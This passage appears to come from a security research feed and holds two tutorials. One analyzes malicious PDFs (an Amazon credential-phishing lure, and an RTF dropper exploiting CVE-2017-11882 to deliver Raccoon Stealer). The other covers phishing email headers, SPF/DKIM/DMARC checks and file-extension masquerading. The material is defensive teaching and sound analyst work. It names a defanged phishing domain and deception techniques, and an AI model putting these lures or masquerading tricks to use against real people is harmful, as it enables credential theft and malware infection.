+&lt;li&gt;&lt;strong&gt;Size&lt;/strong&gt; - number of entries in the cross-reference table&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Root&lt;/strong&gt; - which entry in the table holds the offset for the root object.
+This object is the Document Catalog; it contains information about how the
+file will be presented and references to other objects that describe the
+document&amp;rsquo;s content.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Info&lt;/strong&gt; - which entry in the table holds the offset for the document&amp;rsquo;s
+information dictionary.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;PDF files can be modified so additional elements (such cross-reference tables)
+will be appended to the end of the file. Now that we understand the format,
+let&amp;rsquo;s see how it can be used by attackers to conceal malicious code.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Check out this video on our YouTube channel about analyzing PDFs, where I
+cover the information in this blog as well as four examples of malicious PDFs
+that were used in real attacks.&lt;/em&gt;&lt;/p&gt;
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
+&lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/AzXf7GV0jew?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
+&lt;/div&gt;
+&lt;h2&gt;How PDF Files Get Used to Deliver Malware&lt;span class="hx:absolute hx:-mt-20" id="how-pdf-files-get-used-to-deliver-malware"&gt;&lt;/span&gt;
+&lt;a href="#how-pdf-files-get-used-to-deliver-malware" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;PDF files support a wide variety of data types that can be present (and not
+necessarily visible). Threat actors fully control the content of the files they
+send to lure victims and they use the different capabilities of the PDF format
+for their attacks.&lt;/p&gt;
+&lt;p&gt;Many phishing attacks will contain &lt;strong&gt;links&lt;/strong&gt;, which may appear as clickable
+images of buttons, coupons,
+&lt;a href="https://analyze.intezer.com/files/dd294bd399212b760e68434af9c96a70f0ef9f7bc43b06d67addd3472eb6d69a/behavior"target="_blank" rel="noopener"&gt;fake CAPTCHA&lt;/a&gt;,
+fake play buttons, or
+&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/"target="_blank" rel="noopener"&gt;QR codes&lt;/a&gt;.
+The purpose of these embedded files is to redirect the victims to sites
+controlled by the threat actors where they can proceed to the next stage of the
+attack.&lt;/p&gt;
+&lt;p&gt;PDF files natively support &lt;strong&gt;JavaScript&lt;/strong&gt;, so attackers can create files that
+will
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;execute scripts once a file has been opened&lt;/a&gt;
+at this stage to download additional payload or steal information.&lt;/p&gt;
+&lt;p&gt;Another way in which threat actors can use the format is to deliver malware in
+the &lt;strong&gt;PDF streams&lt;/strong&gt;. Streams can contain any type of data (including scripts
+and binary files) and they can be compressed and encoded which makes it harder
+to detect embedded code inside files. The compression technique is specified
+with the name &lt;code&gt;/filter&lt;/code&gt; (as mentioned in its part of the dictionary that
+describes a stream). A stream can have more than one filter.&lt;/p&gt;
+&lt;p&gt;There are many PDF readers that are being used, some are multiplatform, others
+based on web browsers but like any other software they have bugs and
+vulnerabilities. Adobe PDF Reader alone has
+&lt;a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=adobe&amp;#43;pdf&amp;#43;reader"target="_blank" rel="noopener"&gt;91 reported vulnerabilities&lt;/a&gt;.
+Therefore threat actors can make PDF files that will exploit vulnerabilities,
+which will allow them to execute code and gain access to the victim&amp;rsquo;s endpoint.&lt;/p&gt;
+&lt;h2&gt;Investigating Suspicious PDF Files with Open-source or Free Tools&lt;span class="hx:absolute hx:-mt-20" id="investigating-suspicious-pdf-files-with-open-source-or-free-tools"&gt;&lt;/span&gt;
+&lt;a href="#investigating-suspicious-pdf-files-with-open-source-or-free-tools" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Example 1 of a malicious PDF&lt;span class="hx:absolute hx:-mt-20" id="example-1-of-a-malicious-pdf"&gt;&lt;/span&gt;
+&lt;a href="#example-1-of-a-malicious-pdf" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Let&amp;rsquo;s investigate the following PDF file (MD5:
+&lt;code&gt;a2852936a7e33787c0ab11f346631d89&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;The first tool that we are going to use is
+&lt;a href="https://github.com/jesparza/peepdf"target="_blank" rel="noopener"&gt;peepdf&lt;/a&gt;, &lt;strong&gt;a free python tool&lt;/strong&gt; that
+parses PDF files allowing us to get the types and content of each object. It
+will also color the object and highlight the objects that make the file
+suspicious, like the presence of JavaScript and embedded files.&lt;/p&gt;
+&lt;p&gt;After running the &lt;code&gt;peepdf&lt;/code&gt; with the PDF file we get the output below. We can
+see that the file was updated and it has two versions. In the later version we
+can spot an encoded JavaScript code which makes this file suspicious so we will
+extract the content of the object and investigate it.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/pdf/images/fig1.png" title="Output of peepdf" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Output of peepdf&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;To extract the data from the suspicious object number 18 we will use &lt;strong&gt;another
+open-source tool&lt;/strong&gt; called
+&lt;a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdf-parser.py"target="_blank" rel="noopener"&gt;pdf-parser&lt;/a&gt;
+created by Didier Stevens. This free python tool allows us to inspect and
+extract different objects. The command below will extract the JavaScript saved
+in the object into a file called &lt;code&gt;extract_js&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;pdf-parser.py -f -o 18 -d extract_js files/example1.pdf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Upon inspecting the JavaScript code we can determine that the PDF file will
+open a window that will ask the victim to login into his Amazon account&amp;hellip; but
+the data will be actually be submitted to a malicious site
+&lt;code&gt;http://sellercentral[.]amazon.de.56U8GTHDGT4U7YWEWE84GTYS.abecklink.com&lt;/code&gt; for
+credential stealing.&lt;/p&gt;
+&lt;p&gt;In the screenshot below is the execution of the PDF file in Intezer, which lets
+us inspect the behavior of the file.&lt;/p&gt;
+&lt;p&gt;This PDF was sent as part of a
+&lt;a href="https://www.bleepingcomputer.com/news/security/clever-amazon-phishing-scam-creates-login-prompts-in-pdf-docs/"target="_blank" rel="noopener"&gt;phishing scam&lt;/a&gt;
+that targeted German speaking victims: the PDF was attached to an email
+regarding a &amp;ldquo;tax invoice&amp;rdquo; asking the victims to open the attached document and
+login to their Amazon account.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/pdf/images/fig2.png" title="The PDF file as it can be seen in the behavior tab of Intezer&amp;#39;s analysis." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;The PDF file as it can be seen in the behavior tab of Intezer&amp;#39;s analysis.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;Example 2 of a malicious PDF&lt;span class="hx:absolute hx:-mt-20" id="example-2-of-a-malicious-pdf"&gt;&lt;/span&gt;
+&lt;a href="#example-2-of-a-malicious-pdf" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Let&amp;rsquo;s take a look at another PDF file (MD5:
+&lt;code&gt;1ba5c7ecab62609e4f1d44192cef850e&lt;/code&gt;). Once again we could start by running
+&lt;code&gt;peepdf&lt;/code&gt; on the file to understand if the file might be malicious.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/pdf/images/fig3.png" title="Peepdf output" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Peepdf output&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;As we see in the output below, the file contains a JavaScript object (object
+number 9) and one embedded file (object number 8). Let&amp;rsquo;s inspect the content of
+object 8 by running &lt;code&gt;pdf-parser&lt;/code&gt; as we did in the previous example:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;remnux@6866a79d9f93:~$ pdf-parser.py -o 8 -f -d drop_file2 exmple2.pdf
+obj 8 0
+Type: /EmbeddedFile
+Referencing:
+Contains stream
+&amp;lt;&amp;lt;
+/Length 2004304
+/Filter /FlateDecode
+/Type /EmbeddedFile
+&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The content of the embedded file is saved to &lt;code&gt;drop_file2&lt;/code&gt;, we see that the
+stream containing the data is The content of the embedded file is saved to
+&lt;code&gt;drop_file2&lt;/code&gt;. We can see that the stream containing the data is decoded with
+&lt;code&gt;FlateDecode&lt;/code&gt; therefore we use the &lt;code&gt;-f&lt;/code&gt; flag which tells &lt;code&gt;pdf-parser&lt;/code&gt; to pass
+the data through filters. Next we&amp;rsquo;ll check what is the type of the embedded
+data, so let&amp;rsquo;s use the &lt;code&gt;file&lt;/code&gt; command on the extracted file:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;remnux@6866a79d9f93:~$ file drop_file2
+drop_file2: Rich Text Format data, unknown version&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;At this point, we need to investigate an RTF file. We&amp;rsquo;ll use
+&lt;a href="https://github.com/decalage2/oletools/wiki/rtfobj"target="_blank" rel="noopener"&gt;rtfobj&lt;/a&gt; from oletools to
+inspect the file:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/pdf/images/fig4.png" title="rtfobj output for the extracted RTF file" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;rtfobj output for the extracted RTF file&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;In my previous blog about &lt;a href="../office/"&gt;analyzing malicious Office files&lt;/a&gt;, you
+can find more information about the tools and techniques for files like RTF.
+From the output of &lt;code&gt;rtfobj&lt;/code&gt; we learn that the extracted RTF file exploited
+&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882"target="_blank" rel="noopener"&gt;CVE-2017-11882&lt;/a&gt; -
+a known vulnerability in Microsoft Equation Editor that enables code execution.
+Since
+&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-11882"target="_blank" rel="noopener"&gt;Microsoft patched&lt;/a&gt;
+this vulnerability, this particular attack would only be effective if a user
+failed to keep their software updated. Now, we can either continue
+investigating the shellcode located in the RTF file or upload the original PDF
+to Intezer to will automatically execute all the steps we just did and on top
+of that provide a classification of the threat executed by the PDF.&lt;/p&gt;
+&lt;p&gt;The results of the analysis can be seen in the screenshot below:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/pdf/images/fig5.png" title="Behavior tab in the PDF analysis report from Intezer" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Behavior tab in the PDF analysis report from Intezer&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;In the process tree we see the execution chain of the PDF followed by word
+process to open the RTF file and then the call to Equation Editor that is being
+exploited by the RTF. The malware is classified as Raccoon Stealer. We can see
+in the Genetic Analysis tab that the sample shares code with Azorult and that&amp;rsquo;s
+because Raccoon Stealer is considered as its
+&lt;a href="https://blogs.blackberry.com/en/2021/09/threat-thursday-raccoon-infostealer#:~:text=Raccoon%20is%20considered,April%20of%202019."target="_blank" rel="noopener"&gt;successor&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/pdf/images/fig6.png" title="Genetic Analysis tab of the PDF file in Intezer." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Genetic Analysis tab of the PDF file in Intezer.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;Scanning a High Volume of PDFs for Malware&lt;span class="hx:absolute hx:-mt-20" id="scanning-a-high-volume-of-pdfs-for-malware"&gt;&lt;/span&gt;
+&lt;a href="#scanning-a-high-volume-of-pdfs-for-malware" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;PDF files are very common and useful for all types of organizations but the
+flexibility of the PDF format makes it also very attractive for threat actors
+who use it to carry out different sorts of attacks. In this blog we presented
+several open-source and free tools that can be used for static analysis of a
+single PDF.&lt;/p&gt;
+&lt;p&gt;But manual analysis of PDFs isn&amp;rsquo;t scalable for organizations when there are
+hundreds of files (or even more) that need to be investigated. In this case we
+can use a platform like Intezer that will automate the initial investigation of
+the files, allowing us to focus our efforts only on cases where the manual
+analysis is absolutely mandatory.&lt;/p&gt;</description></item><item><title>Phishing Emails</title><link>https://research.intezer.com/docs/how-to-analyze/phishing/</link><pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate><guid>https://research.intezer.com/docs/how-to-analyze/phishing/</guid><description>
+&lt;p&gt;Emails were created as a method to pass messages between users, and now they
+are used by individuals and organizations all around the globe, by both big and
+small companies across all industries. But emails also have a dark side -
+phishing emails that are used by threat actors to gain access to victims'
+systems.&lt;/p&gt;
+&lt;p&gt;Traditionally phishing emails are associated with credential harvesting
+attacks, but that&amp;rsquo;s not the only goal of these attacks. As defined by
+&lt;a href="https://attack.mitre.org/techniques/T1566/"target="_blank" rel="noopener"&gt;MITRE ATT&amp;amp;CK® framework&lt;/a&gt;,
+adversaries also send phishing emails containing malicious links or attachments
+to deploy malware (such as backdoors and ransomware) and further exploit the
+system. For the last four years, the
+&lt;a href="https://www.ic3.gov/Media/PDF/AnnualReport/2022_IC3Report.pdf"target="_blank" rel="noopener"&gt;FBI&amp;rsquo;s Internet Crime Report&lt;/a&gt;
+has found phishing was the top type of cyber crime and also one of most
+prevalent ways ransomware attackers gained initial access.&lt;/p&gt;
+&lt;p&gt;These days, we know better than to open and respond to sketchy emails that make
+wild promises. Consequently, threat actors adapt their techniques and messages
+to increase the chances of successfully luring the victims. Phishing remains a
+lucrative endeavor for cyber criminals, with successful phishing attacks
+leading to a 76% increase of financial losses in 2022, according to email
+security company
+&lt;a href="https://www.proofpoint.com/us/resources/threat-reports/state-of-phish"target="_blank" rel="noopener"&gt;Proofpoint&amp;rsquo;s 2023 report&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;a href="#investigating-phishing-email-campaigns-with-real-life-examples"&gt;&lt;strong&gt;Know the basics about phishing emails? Jump down to learn about automating tasks in your phishing email investigation pipeline.&lt;/strong&gt;&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Since emails are widely used as a means of communication between the company
+and the outside world, security teams have to deal with large amounts of files,
+filtering and inspecting them to prevent phishing emails from reaching the end
+user&amp;rsquo;s mailbox. In addition, threat actors implement different techniques to
+evade detection. In 2023, a wave of phishing emails started using
+&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/"target="_blank" rel="noopener"&gt;QR codes to hide malicious links&lt;/a&gt;
+and evade email security tools.&lt;/p&gt;
+&lt;p&gt;In this blog, we will cover techniques used by threat actors to make phishing
+emails &lt;em&gt;look&lt;/em&gt; legitimate and deliver malware to the victim&amp;rsquo;s endpoint. We will
+show practical tools in which you can identify malicious emails and what are
+the next steps of the investigation you need to take following the discovery of
+malicious emails in your organization.&lt;/p&gt;
+&lt;h2&gt;How Are Email Files Used by Threat Actors?&lt;span class="hx:absolute hx:-mt-20" id="how-are-email-files-used-by-threat-actors"&gt;&lt;/span&gt;
+&lt;a href="#how-are-email-files-used-by-threat-actors" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Threat actors use emails to get initial access to the victim, from there they
+can launch an attack and steal sensitive information, install backdoors, set
+persistence and cause further damage. Attackers mainly use
+&lt;a href="https://attack.mitre.org/techniques/T1566/001/"target="_blank" rel="noopener"&gt;attachments&lt;/a&gt; or
+&lt;a href="https://attack.mitre.org/techniques/T1566/002/"target="_blank" rel="noopener"&gt;links&lt;/a&gt;, to deploy and execute
+their malicious intentions.&lt;/p&gt;
+&lt;p&gt;Emails can be sent with &lt;strong&gt;malicious attachments&lt;/strong&gt; of any type: documents,
+executables, images, video, scripts, etc. Usually, threat actors create
+phishing emails with a message that lures the victim into opening the attached
+files. Once the file is opened the first stage of the attack is executed.&lt;/p&gt;
+&lt;p&gt;Another way of delivering threats to the victim&amp;rsquo;s endpoint is by using &lt;strong&gt;links
+to fraudulent websites&lt;/strong&gt; in the message, either displayed in plain sight or
+hidden behind text, images, or QR codes. The end goal of the attackers is to
+trick users into opening the links, so they can steal sensitive information or
+deploy the first stage of the attack to the endpoint.&lt;/p&gt;
+&lt;h2&gt;How to Inspect Phishing Email Files like an Experienced Analyst&lt;span class="hx:absolute hx:-mt-20" id="how-to-inspect-phishing-email-files-like-an-experienced-analyst"&gt;&lt;/span&gt;
+&lt;a href="#how-to-inspect-phishing-email-files-like-an-experienced-analyst" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let&amp;rsquo;s start by looking at the emails like an experienced investigator, then we
+can explore some free or advanced tools we might want to use.&lt;/p&gt;
+&lt;p&gt;Emails consist of a &lt;strong&gt;header&lt;/strong&gt; and &lt;strong&gt;body&lt;/strong&gt;, so inspecting those can provide
+helpful information for an investigation and indicate whether the emails are
+malicious. The message of the email can raise suspicion – for a trained eye,
+the attachments and the sender domain can also be a trigger to investigate the
+email. As SOC analysts and investigators, it is important to recognize the
+signs and methods of malicious emails because the threat can be delivered in
+several ways, and some of them are sneaky.&lt;/p&gt;
+&lt;h3&gt;Inspecting the Sender Address and Email Header&lt;span class="hx:absolute hx:-mt-20" id="inspecting-the-sender-address-and-email-header"&gt;&lt;/span&gt;
+&lt;a href="#inspecting-the-sender-address-and-email-header" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Assuming that you have blocked a known spam address and you monitor specific
+keywords that indicate that an email is malicious, phishing emails still can
+find their way into your inbox. To identify a malicious email you need to
+closely inspect and understand who is the original sender of the email and
+whether it&amp;rsquo;s a legitimate entity or an attacker.&lt;/p&gt;
+&lt;p&gt;First, examine the email in the inbox, where there are several indicators that
+can give away malicious emails in this stage:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;You didn&amp;rsquo;t expect to receive this email – in many cases phishing emails do
+not relate to previous connection or correspondence. If you haven&amp;rsquo;t had any
+contact with the sender or their organization, flag the email as suspicious.&lt;/li&gt;
+&lt;li&gt;Misspelled domain or poorly written emails are a strong indication of
+suspicious emails and you must proceed with caution when handling these
+emails.&lt;/li&gt;
+&lt;li&gt;Take into consideration that big organizations and service providers will
+not send emails from free domains such as &lt;code&gt;gmail[.]com&lt;/code&gt; or &lt;code&gt;outlook[.]com&lt;/code&gt;.
+Usually these organizations have their own private domain in the format of
+&lt;code&gt;XXX@&amp;lt;domain_organisation&amp;gt;.com&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;A common method used by attackers to lure victims into opening emails is by
+using spoofed email addresses (to make the email look like it came from a known
+and trusted entity) – there are sites that let you send emails from a given
+domain or use a certain name that will appear in the sender field. But using
+the information in the email&amp;rsquo;s header makes it possible to detect this method.&lt;/p&gt;
+&lt;p&gt;So, if you decide to dig deeper into the email, you need to view the full email
+body and header. Usually you can get it by opening the additional option menu
+of the email service provider.&lt;/p&gt;
+&lt;h3&gt;Email File Header&lt;span class="hx:absolute hx:-mt-20" id="email-file-header"&gt;&lt;/span&gt;
+&lt;a href="#email-file-header" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The header contains important fields that can help in identifying malicious
+emails:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;From&lt;/code&gt;&lt;/strong&gt;: Who sent the message, however this field can be modified as
+mentioned above. The anomalies we mentioned about the sender apply here as
+well.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;To&lt;/code&gt;&lt;/strong&gt;: Recipient&amp;rsquo;s name and email address. This field can help in
+determining the real target of an email, in case we determine that the email
+is malicious the recipient can determine if the attack targets specific
+victims.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;Received&lt;/code&gt;&lt;/strong&gt;: The most reliable field that provides information about the
+origin of the email. An email that is being sent from one user to another
+passes through one or more servers until it reaches its destination, similar
+to post offices. Each agent adds a layer of information that contains a
+timestamp and information about the server from which the email was received
+from, that&amp;rsquo;s the reason that some emails contain several &lt;strong&gt;&lt;code&gt;Received&lt;/code&gt;&lt;/strong&gt;
+fields. Therefore, you should &lt;strong&gt;inspect the header from the bottom to the
+top.&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;Return-Path&lt;/code&gt;&lt;/strong&gt;: Address to return the mail.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DKIM signature&lt;/strong&gt;: Checks the DKIM DNS record of the sender to confirm the
+authenticity of the sender using public key cryptography.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SPF&lt;/strong&gt;: Defines which mail servers are authorized to send emails for a
+certain domain based on DNS record, the goal is to prevent attackers from
+sending emails using your domain from any server.
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Received-SPF&lt;/code&gt; field - email sent from permitted servers will show up as
+&amp;ldquo;Pass&amp;rdquo; but it can still be a non-legitimate email if the account has been
+compromised. If the value of the field is either &amp;ldquo;Fail&amp;rdquo; or &amp;ldquo;Softfail&amp;rdquo;, it
+indicates that the email may be spoofed or the domains didn&amp;rsquo;t update their
+SPF records. Here is an example of an email that pretends to be sent by
+Haesung Tech, but the address is spoofed and doesn&amp;rsquo;t pass the SPF check:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/phishing/images/fig1.png" title="Sender Policy Framework (SPF) record of a spoofed address." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Sender Policy Framework (SPF) record of a spoofed address.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Domain-based Message Authentication, Reporting and Conformance (&lt;strong&gt;DMARC&lt;/strong&gt;) is
+another email authentication protocol that uses the information provided by
+either DKIM or SPF (or both). DMARC is implemented to protect the domain from
+unauthorized use in phishing and spoofing attacks. And DMARC enforces
+predefined policy to handle unwanted emails. DMARC, DKIM and SPF are used to
+prevent phishing and unauthorized use of domains. When you inspect emails make
+sure to validate the values in these fields.&lt;/p&gt;
+&lt;p&gt;Other fields in the header that you should know about:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;MIME-version&lt;/code&gt;&lt;/strong&gt; - Multipurpose Internet Mail Extensions (MIME) extends the
+standard email format, it provides support for non-ASCII character sets,
+audio, video and applications. Messages that use MIME must contain the
+version field.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;Message-ID&lt;/code&gt;&lt;/strong&gt; - unique identifier used in emails.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;X-header&lt;/code&gt;&lt;/strong&gt; - custom email headers that can be added to the other standard
+headers. Email providers add specific headers for authentication, information
+about spam, etc. Microsoft Outlook uses &lt;code&gt;X-MS-Exchange&lt;/code&gt; header and Google
+uses &lt;code&gt;X-Google-DKIM&lt;/code&gt;. For example:
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;X-Originating-IP&lt;/code&gt;&lt;/strong&gt; - the IP address of the sender&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;X-Spam-Status&lt;/code&gt;&lt;/strong&gt; &amp;amp; &lt;strong&gt;&lt;code&gt;X-Spam-Level&lt;/code&gt;&lt;/strong&gt; - Spam record set by the mail
+service.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Inspecting Attachments&lt;span class="hx:absolute hx:-mt-20" id="inspecting-attachments"&gt;&lt;/span&gt;
+&lt;a href="#inspecting-attachments" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As described above, emails support a wide variety of attachments, and these
+files can contain malicious code (especially executables or scripts). Commonly
+the email provider will alert upon opening emails that contain executables. But
+that&amp;rsquo;s not always the case for documents like &lt;a href="../pdf/"&gt;PDFs&lt;/a&gt; and
+&lt;a href="../office/"&gt;Microsoft Office files&lt;/a&gt;, which are often used and shared between
+organizations and individuals. These non-binary files are also commonly used by
+threat actors to deliver malicious payloads, and using different techniques,
+execute the first stage of the attack.&lt;/p&gt;
+&lt;p&gt;Threat actors use
+&lt;a href="https://attack.mitre.org/techniques/T1036/007/"target="_blank" rel="noopener"&gt;double extensions&lt;/a&gt; to
+masquerade the true file type to trick users into opening files that might seem
+safe (such as images or text) while it is actually an executable file. By
+default, Windows hides file extensions, so &lt;code&gt;example.txt.exe&lt;/code&gt; would appear as
+&lt;code&gt;example.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The second extension is the real extension of the file and defines which tool
+will be used to open the file. Another technique used to hide the real file
+extension is
+&lt;a href="https://attack.mitre.org/techniques/T1036/002/"target="_blank" rel="noopener"&gt;Right-to-Left Override (RLTO)&lt;/a&gt;
+– Windows supports languages that are written from right to left using a
+Unicode character that causes the text that follows it to be displayed in
+reverse. Threat actors use this method to blend the real file extension with
+the file name.&lt;/p&gt;
